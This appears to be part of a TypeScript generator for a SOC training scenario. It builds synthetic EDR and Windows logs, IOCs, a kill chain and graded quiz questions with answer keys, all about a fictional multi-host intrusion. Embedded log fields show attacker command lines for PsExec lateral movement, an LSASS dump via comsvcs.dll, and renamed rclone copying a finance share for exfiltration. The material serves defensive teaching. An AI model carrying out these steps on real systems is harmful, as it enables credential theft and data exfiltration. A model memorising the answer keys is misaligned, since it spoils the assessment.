      description: "n.harel opened the svcctl named pipe on FS-SRV-03's IPC$ share.",
    }),
    winServiceInstall({
      companyId: cxN, id: "evt_mhi_fs1c_service", ts: T(20 * MIN), host: fs.hostname, fqdn: `${fs.hostname}.nexacorp.local`,
      logSource: "windows_security", targetUser: victim.sam, userEmail: victim.email,
      serviceName: "PSEXESVC", imagePath: "%SystemRoot%\\PSEXESVC.exe", accountName: "LocalSystem",
      serviceType: "user mode service", startType: "demand start",
      installerSid: domainSidFor(cxN, victim.sam),
      severity: "high", mitre: "T1021.002", tactic: "Lateral Movement", incidentId: INC_FS,
      description: "Service Control Manager logged 7045: the PSEXESVC service installed on FS-SRV-03, running as LocalSystem.",
    }),
    csProcess({
      ...csFsH, id: "evt_mhi_fs1d_psexesvc", ts: T(20 * MIN + 2 * SEC), severity: "medium",
      processName: "PSEXESVC.exe", processPath: "C:\\Windows\\PSEXESVC.exe", cmdline: "C:\\Windows\\PSEXESVC.exe",
      parentName: "services.exe", parentPid: PID.fs_services, pid: PID.fs_psexesvc, integrity: "system", runAsUser: "NT AUTHORITY\\SYSTEM",
      sha256: psexesvcHash, signed: true, signatureSubject: "Sysinternals - www.sysinternals.com",
      mitre: "T1569.002", tactic: "Execution",
      description: "services.exe started PSEXESVC.exe on FS-SRV-03.",
    }),
    csFile({
      ...csFsH, id: "evt_mhi_fs1e_dbat", ts: T(20 * MIN + 3 * SEC), severity: "medium",
      path: "C:\\Windows\\Temp\\d.bat", sha256: makeSha256("multihost_d_bat_script_2026"), size: 412,
      actorProcess: "PSEXESVC.exe", actorPid: PID.fs_psexesvc, actorPath: "C:\\Windows\\PSEXESVC.exe", actorParentName: "services.exe", actorParentPid: PID.fs_services,
      runAsUser: "NT AUTHORITY\\SYSTEM", mitre: "T1105", tactic: "Command and Control",
      description: "PSEXESVC.exe wrote C:\\Windows\\Temp\\d.bat on FS-SRV-03.",
    }),
    // LSASS: the same access, as Sysmon records it (GrantedAccess + CallTrace), and the dump file landing.
    sysmonProcessAccess({
      ...csFsH, id: "evt_mhi_fs3a_sysmon_lsass", ts: J(20 * MIN + 30 * SEC, "fs3"),
      sourceImage: "C:\\Windows\\System32\\rundll32.exe", sourcePid: PID.fs_rundll,
      targetImage: "C:\\Windows\\System32\\lsass.exe", targetPid: PID.lsass, grantedAccess: "0x1FFFFF",
      callTrace: "C:\\Windows\\SYSTEM32\\ntdll.dll+9d4c4|C:\\Windows\\System32\\KERNELBASE.dll+2c5f9|C:\\Windows\\SYSTEM32\\comsvcs.dll+5c07|C:\\Windows\\SYSTEM32\\comsvcs.dll+4c7e|C:\\Windows\\System32\\rundll32.exe+3e5f|C:\\Windows\\System32\\KERNEL32.DLL+17614",
      mitre: "T1003.001", tactic: "Credential Access", severity: "critical",
      description: "Sysmon Event 10: rundll32.exe opened lsass.exe with GrantedAccess 0x1FFFFF.",
    }),
    sysmonFile({
      ...csFsH, id: "evt_mhi_fs3b_sysmon_dump", ts: after(J(20 * MIN + 30 * SEC, "fs3"), 17),
      processName: "rundll32.exe", processPath: "C:\\Windows\\System32\\rundll32.exe", pid: PID.fs_rundll,
      path: "C:\\Windows\\Temp\\lsass.dmp", sha256: null, fileSize: 47_185_920, mitre: "T1003.001", tactic: "Credential Access", severity: "high",
      description: "Sysmon Event 11: rundll32.exe created C:\\Windows\\Temp\\lsass.dmp.",
    }),
    winDetailedShareAccess({
      companyId: cxN, id: "evt_mhi_fs3c_dump_read", ts: T(22 * MIN + 40 * SEC), host: fs.hostname, fqdn: `${fs.hostname}.nexacorp.local`,
      logSource: "windows_security", srcIp: ws.ip, targetUser: victim.sam, userEmail: victim.email,
      shareName: "\\\\*\\C$", shareLocalPath: "\\??\\C:\\", relativeTargetName: "Windows\\Temp\\lsass.dmp",
      accessMask: "0x1", accessList: "%%1538\n\t\t\t\t%%1541\n\t\t\t\t%%4416", severity: "high", mitre: "T1003.001", tactic: "Credential Access", incidentId: INC_FS,
      description: "n.harel read Windows\\Temp\\lsass.dmp over the C$ share of FS-SRV-03 from 10.20.6.28.",
    }),
    // The svc_backup credential material is injected into a new logon session (Type 9, seclogo)
    // and psexec.exe runs under it: the originating process of the logon that reaches BKP-SRV-02.
    winLogon({
      companyId: cxN, id: "evt_mhi_fs5a_newcreds_logon", ts: T(30 * MIN - 7 * SEC), host: fs.hostname, fqdn: `${fs.hostname}.nexacorp.local`,
      logSource: "windows_security", srcIp: "127.0.0.1", srcPort: "0",
      targetUser: svc.sam, userEmail: svc.upn, logonType: 9, authPackage: "Negotiate", logonProcess: "seclogo",
      subjectSid: "S-1-5-18", subjectUser: "FS-SRV-03$", processName: "C:\\Windows\\System32\\svchost.exe", workstation: fs.hostname, keyLength: "0", lmPackage: "-",
      severity: "high", mitre: "T1550.002", tactic: "Lateral Movement", incidentId: INC_FS,
      description: "A Type 9 (NewCredentials) logon for svc_backup was created on FS-SRV-03 by the seclogon service.",
    }),
    csProcess({
      ...csFsH, id: "evt_mhi_fs5_psexec_client", ts: T(30 * MIN - 6 * SEC), severity: "high",
      processName: "psexec.exe", processPath: "C:\\Windows\\Temp\\psexec.exe",
      cmdline: "psexec.exe \\\\BKP-SRV-02 -accepteula cmd.exe",
      parentName: "cmd.exe", parentPid: PID.fs_cmd, pid: PID.fs_psexec_client, integrity: "high", runAsUser: "NEXACORP\\svc_backup",
      sha256: psexecClientHash, signed: true, signatureSubject: "Sysinternals - www.sysinternals.com",
      mitre: "T1021.002", tactic: "Lateral Movement",
      description: "cmd.exe on FS-SRV-03 started psexec.exe against BKP-SRV-02 under the svc_backup session.",
    }),

    // ═══════════ INCIDENT 3, corroborating sources on BKP-SRV-02 and the source share ═══════════
    csProcess({
      ...csBk, id: "evt_mhi_bk3a_psexesvc", ts: T(31 * MIN + 42 * SEC), severity: "medium",
      processName: "PSEXESVC.exe", processPath: "C:\\Windows\\PSEXESVC.exe", cmdline: "C:\\Windows\\PSEXESVC.exe",
      parentName: "services.exe", parentPid: PID.bk_services, pid: PID.bk_psexesvc, integrity: "system", runAsUser: "NT AUTHORITY\\SYSTEM",
      sha256: psexesvcHash, signed: true, signatureSubject: "Sysinternals - www.sysinternals.com",
      mitre: "T1569.002", tactic: "Execution",
      description: "services.exe started PSEXESVC.exe on BKP-SRV-02.",
    }),
    csProcess({
      ...csBk, id: "evt_mhi_bk3b_cmd", ts: T(32 * MIN + 8 * SEC), severity: "medium",
      processName: "cmd.exe", processPath: "C:\\Windows\\System32\\cmd.exe", cmdline: "cmd.exe",
      parentName: "PSEXESVC.exe", parentPid: PID.bk_psexesvc, pid: PID.bk_cmd, integrity: "high",
      sha256: cmdHash, signed: true, signatureSubject: "Microsoft Corporation",
      mitre: "T1059.003", tactic: "Execution",
      description: "PSEXESVC.exe started an interactive cmd.exe on BKP-SRV-02 in the svc_backup session.",
    }),
    winDetailedShareAccess({
      companyId: cxN, id: "evt_mhi_bk3c_tool_push", ts: T(32 * MIN + 30 * SEC), host: bkp.hostname, fqdn: `${bkp.hostname}.nexacorp.local`,
      logSource: "windows_security", srcIp: fs.ip, targetUser: svc.sam, userEmail: svc.upn,
      shareName: "\\\\*\\C$", shareLocalPath: "\\??\\C:\\", relativeTargetName: "ProgramData\\Adobe\\svchost-update.exe",
      accessMask: "0x2", accessList: "%%4417", severity: "high", mitre: "T1105", tactic: "Command and Control", incidentId: INC_BK,
      description: "svc_backup wrote ProgramData\\Adobe\\svchost-update.exe over the C$ share of BKP-SRV-02 from 10.20.7.33.",
    }),
    csFile({
      ...csBk, id: "evt_mhi_bk3d_tool_written", ts: T(32 * MIN + 31 * SEC), severity: "high",
      path: "C:\\ProgramData\\Adobe\\svchost-update.exe", sha256: rcloneHash, size: 52_428_800, signed: false,
      actorProcess: "System", actorPid: 4, actorPath: "C:\\Windows\\System32\\ntoskrnl.exe",
      runAsUser: "NT AUTHORITY\\SYSTEM", mitre: "T1105", tactic: "Command and Control",
      description: "C:\\ProgramData\\Adobe\\svchost-update.exe was written on BKP-SRV-02 by the SMB server (remote write from 10.20.7.33).",
    }),
    csFile({
      ...csBk, id: "evt_mhi_bk3e_rclone_conf", ts: T(33 * MIN), severity: "medium",
      path: "C:\\Users\\svc_backup\\AppData\\Roaming\\rclone\\rclone.conf", sha256: null, size: 318,
      actorProcess: "cmd.exe", actorPid: PID.bk_cmd, actorPath: "C:\\Windows\\System32\\cmd.exe", actorParentName: "PSEXESVC.exe", actorParentPid: PID.bk_psexesvc,
      mitre: "T1567.002", tactic: "Exfiltration",
      description: "cmd.exe wrote C:\\Users\\svc_backup\\AppData\\Roaming\\rclone\\rclone.conf on BKP-SRV-02.",
    }),
    csProcess({
      ...csBk, id: "evt_mhi_bk3f_mkdir", ts: T(33 * MIN + 20 * SEC), severity: "low",
      processName: "powershell.exe", processPath: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      cmdline: "powershell.exe -nop -c \"New-Item -ItemType Directory -Path R:\\stage\"",
      parentName: "cmd.exe", parentPid: PID.bk_cmd, pid: PID.bk_mkdir, integrity: "high",
      sha256: psHash, signed: true, signatureSubject: "Microsoft Corporation",
      description: "powershell.exe created the folder R:\\stage on the BKP-SRV-02 backup volume.",
    }),
    // The renamed binary's PE version info, as Sysmon records it at process creation.
    (() => {
      const e = sysmonProcess({
        ...csBk, id: "evt_mhi_bk4a_sysmon_proc", ts: after(J(34 * MIN, "bk4"), 1),
        processName: "svchost-update.exe", processPath: "C:\\ProgramData\\Adobe\\svchost-update.exe",
        cmdline: "svchost-update.exe copy \\\\FS-SRV-03\\Finance R:\\stage --transfers 16",
        parentName: "cmd.exe", parentPath: "C:\\Windows\\System32\\cmd.exe", pid: PID.bk_stage, parentPid: PID.bk_cmd,
        sha256: rcloneHash, signed: false, integrity: "High", originalFileName: "rclone.exe",
        mitre: "T1039", tactic: "Collection", severity: "high",
        description: "Sysmon Event 1 for svchost-update.exe on BKP-SRV-02.",
      });
      e.raw = { ...(e.raw ?? {}),
        "winlog.event_data.Product": "Rclone",
        "winlog.event_data.Company": "https://rclone.org", "winlog.event_data.FileVersion": "1.68.2" };
      return e;
    })(),
    // The source share, as the file server logs it: svc_backup reading \\FS-SRV-03\Finance from BKP-SRV-02.
    ...[
      { n: "a", ms: 34 * MIN + 55 * SEC, rel: "FY26\\Payroll\\payroll_2026_q3.xlsx" },
      { n: "b", ms: 36 * MIN + 10 * SEC, rel: "FY26\\Treasury\\bank_accounts_register.xlsx" },
      { n: "c", ms: 37 * MIN + 30 * SEC, rel: "FY26\\Audit\\board_pack_q3.pdf" },
      { n: "d", ms: 39 * MIN + 40 * SEC, rel: "FY25\\Contracts\\supplier_master_agreements.zip" },
    ].map(({ n, ms, rel }) => winDetailedShareAccess({
      companyId: cxN, id: `evt_mhi_bk4${n}_finance_read`, ts: T(ms), host: fs.hostname, fqdn: `${fs.hostname}.nexacorp.local`,
      logSource: "windows_security", srcIp: bkp.ip, targetUser: svc.sam, userEmail: svc.upn,
      shareName: "\\\\*\\Finance", shareLocalPath: "\\??\\D:\\Shares\\Finance", relativeTargetName: rel,
      accessMask: "0x1", accessList: "%%1538\n\t\t\t\t%%4416", severity: "medium", mitre: "T1039", tactic: "Collection", incidentId: INC_FS,
      description: `svc_backup read ${rel} on the Finance share of FS-SRV-03 from 10.20.7.52.`,
    })),
  ];

  // Story order: the log is read oldest-first.
  events.sort((a, b) => a.ts.localeCompare(b.ts));

  // Falcon's real disposition string for a detect-only alert (no prevention action).
  for (const e of events) {
    if (e.raw?.["crowdstrike.PatternDispositionDescription"] === "Detection, No Action") {
      e.raw["crowdstrike.PatternDispositionDescription"] = "Detection, standard detection.";
    }
  }
  // The dumper runs under the PsExec shell's token (SYSTEM), not as the human who started PsExec.
  for (const e of events) {
    if (e.id === "evt_mhi_fs3_lsass" || e.id === "evt_mhi_fs3a_sysmon_lsass" || e.id === "evt_mhi_fs3b_sysmon_dump") {
      if (e.process) e.process.user = "NT AUTHORITY\\SYSTEM";
      if (e.raw) {
        if ("crowdstrike.UserName" in e.raw) e.raw["crowdstrike.UserName"] = "NT AUTHORITY\\SYSTEM";
        if ("winlog.event_data.User" in e.raw) e.raw["winlog.event_data.User"] = "NT AUTHORITY\\SYSTEM";
      }
    }
  }

  const iocs: IOC[] = [
    { type: "domain", value: c2, first_seen: J(3 * MIN + 40 * SEC, "ws4"), last_seen: J(4 * MIN + 30 * SEC, "ws6"), reputation: "malicious", tags: ["c2", "cobalt-strike"] },
    { type: "domain", value: "supplier-invoices-nexa.com", first_seen: T(-3 * MIN - 20 * SEC), last_seen: J(0, "ws1"), reputation: "malicious", tags: ["lookalike", "phishing-lure"] },
    { type: "ip", value: "91.215.85.142", first_seen: J(0, "ws1"), last_seen: J(0, "ws1"), reputation: "malicious", tags: ["lure-hosting"] },
    { type: "sha256", value: macroDocHash, first_seen: J(0, "ws1"), last_seen: T(2 * MIN + 50 * SEC), reputation: "malicious", tags: ["macro-document", "docm"] },
    { type: "domain", value: exfilHost, first_seen: J(41 * MIN, "bk5"), last_seen: J(41 * MIN + 30 * SEC, "bk6"), reputation: "malicious", tags: ["exfil", "cloud-storage"] },
    { type: "sha256", value: rcloneHash, first_seen: J(34 * MIN, "bk4"), last_seen: J(43 * MIN, "bk7"), reputation: "malicious", tags: ["rclone", "exfil", "renamed"] },
    { type: "ip", value: c2ip, first_seen: J(3 * MIN + 40 * SEC, "ws4"), last_seen: J(4 * MIN + 30 * SEC, "ws6"), reputation: "malicious", tags: ["c2"] },
    { type: "ip", value: exfilIp, first_seen: J(41 * MIN, "bk5"), last_seen: J(41 * MIN + 30 * SEC, "bk6"), reputation: "malicious", tags: ["exfil"] },
    { type: "host", value: ws.hostname, first_seen: J(0, "ws1"), last_seen: J(5 * MIN, "ws7"), reputation: "unknown", tags: ["patient-zero", "affected"] },
    { type: "host", value: fs.hostname, first_seen: J(19 * MIN, "fs1"), last_seen: J(21 * MIN, "fs4"), reputation: "unknown", tags: ["lateral", "affected"] },
    { type: "host", value: bkp.hostname, first_seen: J(30 * MIN, "bk0"), last_seen: J(43 * MIN, "bk7"), reputation: "unknown", tags: ["exfil", "affected"] },
  ];

  const questions: ScenarioQuestion[] = [
    {
      id: "q1",
      prompt: "Three Falcon detections fired on three different hosts within 40 minutes. What is the strongest evidence they are one campaign rather than three unrelated events?",
      hint: "Follow the account, the timing, and the infrastructure across the three incidents.",
      kind: "single",
      options: [
        // correct, deliberately NOT the longest option
        { value: "chain", label: "One actor chains the hosts on a single timeline: n.harel moves FIN-WS-08 → FS-SRV-03 by network logon minutes after the foothold, LSASS is dumped there, and svc_backup from that dump then logs on to BKP-SRV-02" },
        { value: "same_sev", label: "All three detections carry Critical severity and the same PatternDispositionDescription of \"Detection, standard detection.\", and shared severity plus a shared disposition is what groups separate detections into one incident in Falcon" },
        { value: "same_edr", label: "All three were raised by the same CrowdStrike Falcon tenant against sensors reporting to one cloud instance, so Falcon's Incident Workbench has already correlated them into a single case for you automatically" },
        { value: "coincidence", label: "Three separate commodity infections happened to land on the same three-host subnet on the same evening, which is common on a flat internal network with shared local-admin passwords" },
      ],
      answer: "chain",
      xp: 60,
      explanation:
        "Correlation across hosts is built from shared entities and a coherent timeline, not from a shared severity or a shared tool. Here n.harel's foothold on FIN-WS-08 (18:43) is followed by a Type-3 logon as n.harel onto FS-SRV-03 (18:59), an LSASS dump there that captures svc_backup (whose service session is live on FS-SRV-03), and then a Type-3 logon as svc_backup onto BKP-SRV-02 from FS-SRV-03 (19:10) before staging \\\\FS-SRV-03\\Finance, each step feeds the next. Same severity (b) and same vendor (c) are true but prove nothing about causation, and here the three detections were raised as three separate cases, tying them together is the analyst's job. (d) ignores the account and data flow that tie the hosts together.",
    },
    {
      id: "q2",
      prompt: "For FS-SRV-03, which single event is the credential-theft that expands the blast radius beyond one host?",
      kind: "single",
      options: [
        // correct, middle length
        { value: "lsass", label: "The rundll32.exe call to comsvcs.dll MiniDump against lsass.exe (Sysmon Event 10, GrantedAccess 0x1FFFFF), writing lsass.dmp" },
        { value: "psexec", label: "The PsExec landing where services.exe started PSEXESVC.exe, which spawned a SYSTEM cmd.exe running d.bat from C:\\Windows\\Temp" },
        { value: "logon", label: "The Type 3 network logon for n.harel from FIN-WS-08, which is the moment the operator first authenticated to the file server over SMB" },
        { value: "alert", label: "The Falcon DetectionSummaryEvent that names the LsassMiniDumpViaComsvcs technique and rolls the whole services.exe → rundll32.exe tree into one alert" },
      ],
      answer: "lsass",
      xp: 50,
      explanation:
        "The MiniDump of LSASS (T1003.001) is what hands the operator every credential cached on FS-SRV-03, including svc_backup, whose service session is live there, which is exactly how a single-host foothold becomes a multi-host problem (svc_backup then logs on to BKP-SRV-02). The PsExec landing (b) is how the operator arrived, the network logon (c) is the lateral step in, and the summary alert (d) names the technique but is the vendor's roll-up, not the act itself. GrantedAccess 0x1FFFFF (PROCESS_ALL_ACCESS) against lsass.exe in Sysmon Event 10, with comsvcs.dll in the CallTrace (Falcon records the same request as DesiredAccess 2097151), is the tell. The dump itself appears as Sysmon Event 11 for C:\\Windows\\Temp\\lsass.dmp, and the 5145 read of that file over C$ from 10.20.6.28 shows the operator collecting it.",
    },
    {
      id: "q3",
      prompt: "svchost-update.exe on BKP-SRV-02 is unsigned, sits in C:\\ProgramData\\Adobe, and Sysmon's process-creation record shows OriginalFileName rclone.exe (Product Rclone). What does that combination tell you?",
      kind: "single",
      options: [
        // correct, shortest
        { value: "renamed_rclone", label: "It is rclone renamed to hide as an Adobe task, a legitimate sync tool repurposed for exfiltration, proven by the OriginalFilename mismatch" },
        { value: "adobe", label: "It is a genuine Adobe background updater that Falcon misclassified because it was launched from cmd.exe rather than the Adobe service, which changes its parentage and trips the heuristic" },
        { value: "svchost", label: "It is the real Windows svchost.exe running from a non-standard path, which happens when a servicing operation relocates the binary and leaves the PE version resource pointing at its build-time name" },
        { value: "unknown", label: "Nothing can be concluded from on-host metadata alone; the OriginalFilename field is attacker-controlled, so the hash must go to a sandbox and reputation service before any judgement is made" },
      ],
      answer: "renamed_rclone",
      xp: 50,
      explanation:
        "The PE's embedded original file name (Sysmon Event 1 OriginalFileName, with Product Rclone) is rclone.exe while the on-disk name is svchost-update.exe, a deliberate rename to look like a Windows/Adobe background task. rclone is a legitimate cloud-sync utility that operators routinely abuse for exfiltration (T1567.002); the unsigned status, the ProgramData\\Adobe path, and the multi-gigabyte upload to an online-storage host complete the picture. (b) and (c) are the disguises the naming is meant to sell; (d) overstates good practice, reputation is worth checking, but the metadata already answers the question here, and the copy from \\\\FS-SRV-03\\Finance followed by an upload to remote:backup is rclone's own syntax; FS-SRV-03's own 5145 records show svc_backup reading the Finance share from BKP-SRV-02 while it ran.",
    },
    {
      id: "q4",
      prompt: "You are containing this campaign across all three hosts. Which action set matches the evidence?",
      kind: "single",
      options: [
        // correct - NOT the longest
        { value: "all", label: "Network-contain all three hosts, reset n.harel and every account in the LSASS dump (svc_backup included), block the C2 and exfil domains, and treat the finance share as exfiltrated" },
        { value: "ws_only", label: "Isolate FIN-WS-08 first because it is patient zero, then monitor the other two for beaconing, on the basis that cutting the entry point halts any chain that started there before creds were reused" },
        { value: "block_dns", label: "Block cdn-sync-eu.net and store.filedrop-transfer.net at the firewall and sinkhole their IPs, since severing C2 and the exfil path neutralises the operator once the endpoints can no longer reach infrastructure" },
        { value: "reimage", label: "Reimage BKP-SRV-02 to remove the rclone-derived tool and rotate its local admin, treating the other two hosts as clean because no data-loss event fired on either of them" },
      ],
      answer: "all",
      xp: 60,
      explanation:
        "By the time you are looking, the operator holds credentials from FS-SRV-03, has already reused svc_backup to reach a third host, and has pushed data out, so containment has to cover all three hosts at once, invalidate the stolen credentials (reset every exposed account, that also kills the dumped NTLM hashes, rotate svc_backup wherever it is configured, and revoke existing sessions and Kerberos tickets, which a reset alone does not end), and assume the finance share left the building. (b) is false because the operator already pivoted off patient zero with stolen creds. (c) cuts C2 but leaves live credentials and on-host tooling. (d) ignores the credential theft and the foothold on the other two hosts.",
    },
  ];

  return {
    scenario_id: scenarioId,
    title: "Three EDR incidents on three hosts tonight",
    threat_actor: "Hands-on-keyboard intrusion operator (pre-ransomware)",
    attack_kind: "multi_host_intrusion",
    briefing:
      "Three CrowdStrike Falcon detections fired on three different hosts - FIN-WS-08, FS-SRV-03 and BKP-SRV-02, inside 40 minutes tonight. Each opened as its own incident. Work out whether they are one campaign, what the operator took, and how far it spread before you contain it.",
    narrative: `At 18:36 a mail titled Invoice Q3-4471 reached Noa Harel in Accounts Payable from a lookalike supplier domain. At 18:40 she followed its link to supplier-invoices-nexa.com, downloaded Invoice_Q3_4471.docm, opened it in Word at 18:42 and enabled the macro. WINWORD.EXE spawned cmd.exe, which ran an encoded PowerShell that decoded a download cradle: it fetched /agent/stage1.ps1 from cdn-sync-eu.net and ran an in-memory Cobalt Strike beacon (no file was written). From 18:44 FIN-WS-08 was beaconing to cdn-sync-eu.net about once a minute. That is incident one.

Fifteen minutes later the operator used Noa's session to reach the file server. A Type-3 logon for n.harel arrived on FS-SRV-03 from FIN-WS-08 at 18:59, PsExec wrote PSEXESVC.exe to ADMIN$, the service was installed (7045) and a SYSTEM shell ran d.bat, and at 19:01 rundll32.exe, running as SYSTEM under that shell, called comsvcs.dll MiniDump against lsass.exe with full access, writing lsass.dmp, which the operator then read back over the C$ share from FIN-WS-08. Because svc_backup, a backup service account, has a live service session on FS-SRV-03, its secret was in that dump. That is incident two, and it is where a single-workstation problem became a credential problem.

At 19:10 a new Type 9 logon for svc_backup appeared on FS-SRV-03, psexec.exe ran under it, and svc_backup logged on to BKP-SRV-02 from FS-SRV-03; PsExec installed its service there too. By 19:14 an unsigned binary named svchost-update.exe (Sysmon OriginalFileName rclone.exe), pushed over the C$ share at 19:12, began copying \\\\FS-SRV-03\\Finance into R:\\stage, while FS-SRV-03 logged svc_backup reading the share from 10.20.7.52. A second rclone invocation at 19:21 pushed 3.65 GB to store.filedrop-transfer.net. That is incident three.

Falcon raised all three as separate Critical detections. Nothing was contained. The night-shift analyst catches the third alert at 19:23, before the ransomware stage, but after the data has left.`,
    learning_objectives: [
      "Correlate detections across multiple hosts into a single campaign using shared accounts, timeline, and infrastructure, not shared severity or vendor",
      "Investigate each host as its own EDR incident (its own isolated case) while keeping the campaign view",
      "Recognise LSASS MiniDump via comsvcs.dll (T1003.001) as the step that turns a foothold into a credential-theft blast radius, and trace the stolen account onward",
      "Identify a renamed legitimate tool (rclone → svchost-update.exe) from an OriginalFilename mismatch and unsigned status",
      "Scope containment for a multi-host, credential-theft, exfil-complete intrusion, isolate all hosts, invalidate credentials, assume data loss",
    ],
    alerts: [],
    events,
    iocs,
    killchain: [
      { ts: T(-3 * MIN - 20 * SEC), phase: "Initial Access", action: "Lure mail from a lookalike supplier domain delivered; the link is clicked at 18:39 (T1566.002)" },
      { ts: J(3 * MIN, "ws2"), phase: "Initial Access", action: "Macro invoice on FIN-WS-08 spawns cmd → encoded PowerShell (T1204.002 / T1059.003)" },
      { ts: J(3 * MIN + 12 * SEC, "ws3"), phase: "Execution", action: "Encoded PowerShell fetches stage1.ps1 and runs an in-memory Cobalt Strike beacon (T1059.001)" },
      { ts: J(4 * MIN, "ws5"), phase: "C2", action: `Beacon to ${c2} (T1071.001)` },
      { ts: J(19 * MIN, "fs1"), phase: "Lateral Movement", action: "Type-3 logon FIN-WS-08 → FS-SRV-03; PsExec via ADMIN$ and svcctl, 7045 (T1021.002)" },
      { ts: J(20 * MIN + 30 * SEC, "fs3"), phase: "Credential Access", action: "LSASS MiniDump via comsvcs.dll on FS-SRV-03 captures svc_backup (T1003.001)" },
      { ts: J(30 * MIN, "bk0"), phase: "Lateral Movement", action: "svc_backup (stolen) logs on to BKP-SRV-02 from FS-SRV-03; PsExec + 7045 (T1021.002)" },
      { ts: J(34 * MIN, "bk4"), phase: "Collection", action: "Renamed rclone stages \\\\FS-SRV-03\\Finance on BKP-SRV-02 (T1039)" },
      { ts: J(41 * MIN, "bk5"), phase: "Exfiltration", action: `3.65 GB pushed to ${exfilHost} (T1567.002)` },
      { ts: J(43 * MIN, "bk7"), phase: "Detection", action: "Third Falcon detection, analyst intervenes before ransomware" },
    ],
    questions,
  };
}
